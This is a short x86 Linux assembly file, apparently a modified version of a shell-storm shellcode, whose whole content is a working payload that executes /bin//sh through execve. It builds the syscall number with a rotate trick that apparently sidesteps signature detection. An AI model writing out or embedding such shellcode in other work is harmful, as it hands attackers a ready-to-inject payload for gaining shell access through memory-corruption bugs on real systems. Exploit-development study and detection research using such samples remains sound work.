;http://shell-storm.org/shellcode/files/shellcode-575.php

global _start
_start:
	xor ecx,ecx
	push ecx
	push   0x68732f2f
	push   0x6e69622f
	mov ebx,esp

	mul ecx

	mov ax,0x2c	; to mov 0x0b in eal, moved 2c and then roted by 2 positions
	ror eax,2
	int 0x80
